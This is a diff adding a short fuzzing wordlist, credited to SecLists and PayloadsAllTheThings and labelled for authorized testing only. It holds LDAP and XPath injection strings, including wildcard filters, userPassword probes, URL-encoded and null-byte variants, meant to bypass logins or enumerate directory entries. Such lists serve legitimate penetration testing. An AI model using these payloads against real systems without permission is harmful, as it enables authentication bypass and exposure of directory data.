@@ -1,0 +1,34 @@
+# Big fuzz set — consolidated from SecLists (MIT) + PayloadsAllTheThings. Authorized testing only.
+!
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+&
+(
+)
+)(cn=))\x00
+*
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(&
+*)(uid=*))(|(uid=*
+*))%00
+*/*
+*|
+/
+//
+//*
+@*
+admin*
+admin*)((|userPassword=*)
+admin*)((|userpassword=*)
+x' or name()='username' or 'x'='y
+x' or name()='username' or 'x'='ys!
+|
